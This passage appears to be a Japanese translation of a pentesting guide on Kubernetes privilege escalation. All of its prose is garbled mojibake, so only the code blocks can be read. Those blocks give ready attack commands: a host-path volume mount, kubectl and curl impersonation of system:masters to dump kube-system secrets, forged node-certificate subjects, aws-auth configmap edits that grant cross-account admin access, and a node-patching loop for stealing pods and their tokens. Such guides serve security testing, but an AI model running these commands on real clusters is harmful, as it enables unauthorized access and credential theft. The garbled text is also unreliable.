æ¬¡ã®ã‚ˆã†ã«ã€ä»¥å‰ã®ã‚‚ã®ã¨åŒæ§˜ã®ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã‚’é˜²ããŸã‚ã«ã€hostPath ãƒã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã›ãšã«ã€PersistentVolume ã¨ PersistentVolumeClaim ã‚’ä½¿ç”¨ã—ã¦ã€ãƒ›ã‚¹ãƒˆã®ãƒ•ã‚©ãƒ«ãƒ€ã‚’ã‚³ãƒ³ãƒ†ãƒŠã«æ›¸ãè¾¼ã¿å¯èƒ½ãªã‚¢ã‚¯ã‚»ã‚¹ã§ãƒã‚¦ãƒ³ãƒˆã—ã¾ã™ã€‚
```yaml
apiVersion: v1
kind: PersistentVolume
metadata:
name: task-pv-volume-vol
labels:
type: local
spec:
storageClassName: manual
capacity:
storage: 10Gi
accessModes:
- ReadWriteOnce
hostPath:
path: "/var/log"
---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
name: task-pv-claim-vol
spec:
storageClassName: manual
accessModes:
- ReadWriteOnce
resources:
requests:
storage: 3Gi
---
apiVersion: v1
kind: Pod
metadata:
name: task-pv-pod
spec:
volumes:
- name: task-pv-storage-vol
persistentVolumeClaim:
claimName: task-pv-claim-vol
containers:
- name: task-pv-container
image: ubuntu:latest
command: [ "sh", "-c", "sleep 1h" ]
volumeMounts:
- mountPath: "/hostlogs"
name: task-pv-storage-vol
```
### **ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãªã‚Šã™ã¾ã—**

[**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãªã‚Šã™ã¾ã—**](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#user-impersonation) æ¨©é™ã‚’æŒã¤ã¨ã€æ”»æ’ƒè€…ã¯ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚

å˜ã«`kubectl`ã‚³ãƒãƒ³ãƒ‰ã§ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ `--as=<username>` ã‚’ä½¿ç”¨ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãªã‚Šã™ã¾ã—ã€ã¾ãŸã¯`--as-group=<group>` ã‚’ä½¿ç”¨ã—ã¦ã‚°ãƒ«ãƒ¼ãƒ—ã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
kubectl get pods --as=system:serviceaccount:kube-system:default
kubectl get secrets --as=null --as-group=system:masters
```
ã¾ãŸã¯ã€REST API ã‚’ä½¿ç”¨ã—ã¾ã™:
```bash
curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
-H "Impersonate-Group: system:masters"\
-H "Impersonate-User: null" \
-H "Accept: application/json" \
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒªã‚¹ãƒˆ

**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ãƒªã‚¹ãƒˆæ¨©é™ã¯ã€æ”»æ’ƒè€…ãŒå®Ÿéš›ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã‚€ã“ã¨ã‚’å¯èƒ½ã«ã™ã‚‹** REST API ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¸ã®ã‚¢ã‚¯ã‚»ã‚¹:
```bash
curl -v -H "Authorization: Bearer <jwt_token>" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
```
### ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®èª­ã¿å–ã‚Š - ãƒˆãƒ¼ã‚¯ãƒ³ ID ã®ç·å½“ãŸã‚Šæ”»æ’ƒ

èª­ã¿å–ã‚Šæ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ãã‚Œã‚’ä½¿ç”¨ã™ã‚‹ãŸã‚ã«ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®æ­£ç¢ºãªåå‰ãŒå¿…è¦ã§ã™ãŒã€ã‚ˆã‚Šåºƒç¯„ãª _**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã®ä¸€è¦§è¡¨ç¤º**_ æ¨©é™ã¨ã¯ç•°ãªã‚Šã€ã¾ã è„†å¼±æ€§ãŒå­˜åœ¨ã—ã¾ã™ã€‚ã‚·ã‚¹ãƒ†ãƒ å†…ã®ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’åˆ—æŒ™ã™ã‚‹ã“ã¨ãŒã§ãã€ãã‚Œãã‚ŒãŒã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«é–¢é€£ä»˜ã‘ã‚‰ã‚Œã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¯ã€é™çš„ãªæ¥é ­è¾ã«ç¶šããƒ©ãƒ³ãƒ€ãƒ ãª5æ–‡å­—ã®è‹±æ•°å­—ãƒˆãƒ¼ã‚¯ãƒ³ï¼ˆç‰¹å®šã®æ–‡å­—ã‚’é™¤ãï¼‰ã«ã‚ˆã‚‹åå‰æ§‹é€ ã‚’æŒã£ã¦ã„ã¾ã™ã€‚[ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰](https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#L83)ã«ã‚ˆã‚‹ã¨ã€ãƒˆãƒ¼ã‚¯ãƒ³ã¯åˆ¶é™ã•ã‚ŒãŸ27æ–‡å­—ã®ã‚»ãƒƒãƒˆï¼ˆ`bcdfghjklmnpqrstvwxz2456789`ï¼‰ã‹ã‚‰ç”Ÿæˆã•ã‚Œã¾ã™ã€‚

ã“ã®åˆ¶é™ã«ã‚ˆã‚Šã€ç·å½“ãŸã‚Šæ”»æ’ƒã‚’å®Ÿè¡Œã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¨æ¸¬ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã¨ãªã‚Šã€åˆè¨ˆ14,348,907é€šã‚Šï¼ˆ27^5ï¼‰ã®çµ„ã¿åˆã‚ã›ã«æ¸›å°‘ã—ã¾ã™ã€‚ãã®çµæœã€æ”»æ’ƒè€…ã¯æ•°æ™‚é–“ã§ãƒˆãƒ¼ã‚¯ãƒ³ã‚’æ¨æ¸¬ã—ã€æ©Ÿå¯†æ€§ã®é«˜ã„ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã§ç‰¹æ¨©æ˜‡æ ¼ã‚’å¼•ãèµ·ã“ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### è¨¼æ˜æ›¸ç½²åãƒªã‚¯ã‚¨ã‚¹ãƒˆ

ãƒªã‚½ãƒ¼ã‚¹ `certificatesigningrequests`ï¼ˆã¾ãŸã¯å°‘ãªãã¨ã‚‚ `certificatesigningrequests/nodeClient` ï¼‰ã§å‹•è© **`create`** ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€æ–°ã—ã„ãƒãƒ¼ãƒ‰ã® CeSR ã‚’ **ä½œæˆ** ã§ãã¾ã™ã€‚

[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã«ã‚ˆã‚‹ã¨ã€ã“ã‚Œã‚‰ã®ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’è‡ªå‹•æ‰¿èªã™ã‚‹ã“ã¨ãŒå¯èƒ½](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet-tls-bootstrapping/) ã§ã‚ã‚Šã€ãã®å ´åˆã¯ **è¿½åŠ ã®æ¨©é™ãŒä¸è¦** ã§ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’æ‰¿èªã§ãã‚‹å¿…è¦ãŒã‚ã‚Šã€`certificatesigningrequests/approval` ã§ã®æ›´æ–°ã¨ `signers` ã§ã® `approve` ãŒ `<signerNameDomain>/<signerNamePath>` ã¾ãŸã¯ `<signerNameDomain>/*` ã® resourceName ã§ã‚ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚

å¿…è¦ãªã™ã¹ã¦ã®æ¨©é™ã‚’æŒã¤ **ãƒ­ãƒ¼ãƒ«ã®ä¾‹** ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: csr-approver
rules:
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests
verbs:
- get
- list
- watch
- create
- apiGroups:
- certificates.k8s.io
resources:
- certificatesigningrequests/approval
verbs:
- update
- apiGroups:
- certificates.k8s.io
resources:
- signers
resourceNames:
- example.com/my-signer-name # example.com/* can be used to authorize for all signers in the 'example.com' domain
verbs:
- approve
```
æ–°ã—ã„ãƒãƒ¼ãƒ‰CSRãŒæ‰¿èªã•ã‚ŒãŸã®ã§ã€ãƒãƒ¼ãƒ‰ã®ç‰¹æ¨©ã‚’æ‚ªç”¨ã—ã¦ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ç›—ã¿ã€æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

[**ã“ã®æŠ•ç¨¿**](https://www.4armed.com/blog/hacking-kubelet-on-gke/)ã¨[**ã“ã®æŠ•ç¨¿**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/)ã§ã¯ã€GKE K8s TLSãƒ–ãƒ¼ãƒˆã‚¹ãƒˆãƒ©ãƒƒãƒ—æ§‹æˆãŒ**è‡ªå‹•ç½²å**ã§æ§‹æˆã•ã‚Œã€æ–°ã—ã„K8sãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã‚’ç”Ÿæˆã—ã¦ã€ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã¦æ¨©é™ã‚’æ˜‡æ ¼ã•ã›ã‚‹æ–¹æ³•ãŒæ‚ªç”¨ã•ã‚Œã¦ã„ã¾ã™ã€‚ã‚‚ã—ã‚ãªãŸãŒ**è¨€åŠã•ã‚ŒãŸç‰¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€åŒã˜ã“ã¨ãŒã§ãã¾ã™**ã€‚æœ€åˆã®ä¾‹ã¯ã€æ–°ã—ã„ãƒãƒ¼ãƒ‰ãŒã‚³ãƒ³ãƒ†ãƒŠå†…ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ããªã„ã‚¨ãƒ©ãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ã€‚ãªãœãªã‚‰ã€**ãƒãƒ¼ãƒ‰ã¯ãã‚Œã«ãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸã‚³ãƒ³ãƒ†ãƒŠã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«ã®ã¿ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹**ã‹ã‚‰ã§ã™ã€‚

ã“ã‚Œã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹æ–¹æ³•ã¯ã€å˜ã«**èˆˆå‘³æ·±ã„ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’ãƒã‚¦ãƒ³ãƒˆã—ãŸã‚³ãƒ³ãƒ†ãƒŠãŒã‚ã‚‹ãƒãƒ¼ãƒ‰åã®ãƒãƒ¼ãƒ‰è³‡æ ¼æƒ…å ±ã‚’ä½œæˆã™ã‚‹**ã“ã¨ã§ã™ï¼ˆãŸã ã—ã€æœ€åˆã®æŠ•ç¨¿ã§æ–¹æ³•ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰:
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

EKSï¼ˆAWSå†…ã«ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®kube-systemãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã§**`configmaps`**ã‚’å¤‰æ›´ã§ãã‚‹ä¸»ä½“ã¯ã€**aws-auth** configmapã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ç®¡ç†è€…æ¨©é™ã‚’å–å¾—ã§ãã¾ã™ã€‚\
å¿…è¦ãªå‹•è©ã¯**`update`**ã¨**`patch`**ã§ã™ã€‚configmapãŒä½œæˆã•ã‚Œã¦ã„ãªã„å ´åˆã¯**`create`**ãŒå¿…è¦ã§ã™ï¼š
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
**ä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ã‹ã‚‰ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’ä¸ãˆã‚‹ãŸã‚ã«**`aws-auth`**ã‚’**æ°¸ç¶šåŒ–**ã«ä½¿ç”¨ã§ãã¾ã™ã€‚

ãŸã ã—ã€`aws --profile other_account eks update-kubeconfig --name <cluster-name>` ã¯**ç•°ãªã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã¯æ©Ÿèƒ½ã—ã¾ã›ã‚“**ã€‚ã—ã‹ã—ã€å®Ÿéš›ã«ã¯ `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã®ARNã‚’åå‰ã ã‘ã§ãªãARNã§æŒ‡å®šã™ã‚‹ã¨æ©Ÿèƒ½ã—ã¾ã™ã€‚\
`kubectl`ã‚’æ©Ÿèƒ½ã•ã›ã‚‹ã«ã¯ã€**è¢«å®³è€…ã®kubeconfigã‚’æ§‹æˆ**ã—ã€aws exec argsã« `--profile other_account_role` ã‚’è¿½åŠ ã—ã¦ã€kubectlãŒä»–ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å–å¾—ã—ã€AWSã«æ¥ç¶šã™ã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
{% endhint %}

### GKEã§ã®æ˜‡æ ¼

**GCPãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã«K8sæ¨©é™ã‚’å‰²ã‚Šå½“ã¦ã‚‹æ–¹æ³•ã¯2ã¤**ã‚ã‚Šã¾ã™ã€‚ã„ãšã‚Œã®å ´åˆã‚‚ã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã®è³‡æ ¼æƒ…å ±ã‚’åé›†ã™ã‚‹ãŸã‚ã«**`container.clusters.get`**æ¨©é™ã‚‚å¿…è¦ã§ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€**ç‹¬è‡ªã®kubectlæ§‹æˆãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç”Ÿæˆã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™**ï¼ˆæ¬¡ã®ãƒªãƒ³ã‚¯ã‚’å‚ç…§ï¼‰ã€‚

{% hint style="warning" %}
K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹éš›ã«ã€**GCPèªè¨¼ãƒˆãƒ¼ã‚¯ãƒ³ãŒé€ä¿¡ã•ã‚Œã¾ã™**ã€‚ãã®å¾Œã€GCPã¯K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä»‹ã—ã¦ã€ã¾ãšãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼ˆãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã§ï¼‰ãŒã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§**ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã€æ¬¡ã«**GCP IAMçµŒç”±ã§ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã£ã¦ã„ã‚‹ã‹ã©ã†ã‹**ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™ã€‚\
ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒ**true**ã§ã‚ã‚Œã°ã€å¿œç­”ã•ã‚Œã¾ã™ã€‚ãã†ã§ãªã„å ´åˆã¯ã€**GCP IAMçµŒç”±ã§æ¨©é™ã‚’ä»˜ä¸ã™ã‚‹ã‚ˆã†ã«**ã¨ã„ã†ã‚¨ãƒ©ãƒ¼ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ã€‚
{% endhint %}

ãã®å¾Œã€æœ€åˆã®æ–¹æ³•ã¯**GCP IAM**ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€K8sæ¨©é™ã«ã¯**ãã‚Œã«ç›¸å½“ã™ã‚‹GCP IAMæ¨©é™**ãŒã‚ã‚Šã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ãŒãã‚Œã‚’æŒã£ã¦ã„ã‚Œã°ä½¿ç”¨ã§ãã¾ã™ã€‚

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

2ç•ªç›®ã®æ–¹æ³•ã¯ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼å†…ã§**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’è­˜åˆ¥ã™ã‚‹ãŸã‚ã«ãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹**ï¼ˆGCPã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’å«ã‚€ï¼‰ã‚’ä½¿ç”¨ã—ã¦**K8sæ¨©é™ã‚’å‰²ã‚Šå½“ã¦ã‚‹**ã“ã¨ã§ã™ã€‚

### ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒˆãƒ¼ã‚¯ãƒ³ã®ä½œæˆ

**TokenRequests** (`serviceaccounts/token`ã‚’ä½œæˆã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«)ã€‚K8s APIã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹éš›ã«SAsï¼ˆ[ã“ã¡ã‚‰](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token\_request.rego)ã®æƒ…å ±ï¼‰ã€‚

### ephemeralcontainers

**`pods/ephemeralcontainers`**ã‚’**`update`**ã¾ãŸã¯**`patch`**ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€ä»–ã®ãƒãƒƒãƒ‰ã§**ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã—ã€ç‰¹æ¨©ã®ã‚ã‚‹securityContextã‚’æŒã¤ephemeralã‚³ãƒ³ãƒ†ãƒŠã‚’è¿½åŠ ã™ã‚‹ã“ã¨ã§ã€ãã®ãƒãƒ¼ãƒ‰ã«**ä¾µå…¥**ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

### ValidatingWebhookConfigurationsã¾ãŸã¯MutatingWebhookConfigurations

`validatingwebhookconfigurations`ã¾ãŸã¯`mutatingwebhookconfigurations`ã®ã„ãšã‚Œã‹ã®å‹•è©`create`ã€`update`ã¾ãŸã¯`patch`ã‚’æŒã¤ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**ãã®ã‚ˆã†ãªwebhookconfigurationsã‚’ä½œæˆ**ã—ã¦**ç‰¹æ¨©ã‚’æ˜‡æ ¼**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

[`mutatingwebhookconfigurations`ã®ä¾‹ã¯ã€ã“ã®æŠ•ç¨¿ã®ã“ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã‚’å‚ç…§ã—ã¦ãã ã•ã„](./#malicious-admission-controller)ã€‚

### æ˜‡æ ¼

æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª­ã‚€ã“ã¨ãŒã§ãã‚‹ã‚ˆã†ã«ã€[**çµ„ã¿è¾¼ã¿ç‰¹æ¨©æ˜‡æ ¼é˜²æ­¢**](./#built-in-privileged-escalation-prevention)ã§ã¯ã€ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯æ–°ã—ã„æ¨©é™ã‚’æŒã£ã¦ã„ãªã„é™ã‚Šã€ãƒ­ãƒ¼ãƒ«ã‚„ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°ã¾ãŸã¯ä½œæˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚**`roles`**ã¾ãŸã¯**`clusterroles`**ä¸Šã«**`escalate`**å‹•è©ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã‚’é™¤ã„ã¦ã€‚\
ãã®å¾Œã€å½¼ã¯è‡ªåˆ†è‡ªèº«ã«ãã‚Œã‚‰ã®æ–°ã—ã„æ¨©é™ã‚’æŒã¤ãƒ­ãƒ¼ãƒ«ã€ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ãƒ­ãƒ¼ãƒ«ã‚’æ›´æ–°/ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### ãƒãƒ¼ãƒ‰ãƒ—ãƒ­ã‚­ã‚·

**`nodes/proxy`**ã‚µãƒ–ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹æ¨©ã‚’æŒã¤ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€Kubelet APIã‚’ä»‹ã—ã¦ãƒãƒƒãƒ‰ä¸Šã§ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã§ãã¾ã™ï¼ˆ[ã“ã¡ã‚‰](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes\_proxy.rego)ã«ã‚ˆã‚‹ï¼‰ã€‚Kubeletèªè¨¼ã«é–¢ã™ã‚‹è©³ç´°æƒ…å ±ã¯ã€ã“ã®ãƒšãƒ¼ã‚¸ã§ç¢ºèªã§ãã¾ã™ï¼š

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

[**Kubelet APIã«èªè¨¼ã•ã‚ŒãŸçŠ¶æ…‹ã§RCEã‚’å–å¾—ã™ã‚‹ä¾‹ã¯ã“ã¡ã‚‰**](../pentesting-kubernetes-services/#kubelet-rce)ã€‚

### ãƒãƒƒãƒ‰ã®å‰Šé™¤ + ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ã®ãƒãƒ¼ãƒ‰

**ãƒãƒƒãƒ‰ã‚’å‰Šé™¤**ã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼ˆ`pods`ãƒªã‚½ãƒ¼ã‚¹ä¸Šã®`delete`å‹•è©ï¼‰ã€ã¾ãŸã¯**ãƒãƒƒãƒ‰ã‚’è¿½ã„å‡ºã™**ã“ã¨ãŒã§ãã‚‹ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ï¼ˆ`pods/eviction`ãƒªã‚½ãƒ¼ã‚¹ä¸Šã®`create`å‹•è©ï¼‰ã€ã¾ãŸã¯**ãƒãƒƒãƒ‰ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚’å¤‰æ›´**ã§ãã‚‹ï¼ˆ`pods/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã¯ã€**ä»–ã®ãƒãƒ¼ãƒ‰ã‚’ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒ«ä¸å¯ã«ã§ãã‚‹**ï¼ˆ`nodes/status`ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ï¼‰ã‹ã€**ãƒãƒ¼ãƒ‰ã‚’å‰Šé™¤**ã§ãã‚‹ï¼ˆ`nodes`ãƒªã‚½ãƒ¼ã‚¹ä¸Šã®`delete`å‹•è©ï¼‰å ´åˆã€ãƒãƒƒãƒ‰ã‚’åˆ¶å¾¡ã§ãã‚‹ã¨ã€ä»–ã®ãƒãƒ¼ãƒ‰ã‹ã‚‰ãƒãƒƒãƒ‰ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã€ãã‚Œã‚‰ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’**ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ã‚µãƒ¼ãƒ“ã‚¹ã®çŠ¶æ…‹ï¼ˆCVE-2020-8554ï¼‰

**`services/status`** ã‚’**å¤‰æ›´**ã§ãã‚‹ä¸»ä½“ã¯ã€`status.loadBalancer.ingress.ip` ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã‚’è¨­å®šã—ã¦ã€**ä¿®æ­£ã•ã‚Œã¦ã„ãªã„CVE-2020-8554**ã‚’æ‚ªç”¨ã—ã€**ã‚¯ãƒ©ã‚¹ã‚¿ãƒ¼ã«å¯¾ã™ã‚‹MiTMæ”»æ’ƒ**ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚CVE-2020-8554ã®ã»ã¨ã‚“ã©ã®ç·©å’Œç­–ã¯ã€ExternalIPã‚µãƒ¼ãƒ“ã‚¹ã‚’é˜²ãã ã‘ã§ã™ï¼ˆ[**ã“ã¡ã‚‰**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)ã«ã‚ˆã‚‹ï¼‰ã€‚

### ãƒãƒ¼ãƒ‰ã¨ãƒãƒƒãƒ‰ã®çŠ¶æ…‹

`nodes/status`ã¾ãŸã¯`pods/status`ã®**`update`**ã¾ãŸã¯**`patch`**æ¨©é™ã‚’æŒã¤ä¸»ä½“ã¯ã€ã‚¹ã‚±ã‚¸ãƒ¥ãƒ¼ãƒªãƒ³ã‚°åˆ¶ç´„ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚ã«ãƒ©ãƒ™ãƒ«ã‚’å¤‰æ›´ã§ãã¾ã™ã€‚

## çµ„ã¿è¾¼ã¿ç‰¹æ¨©æ˜‡æ ¼é˜²æ­¢

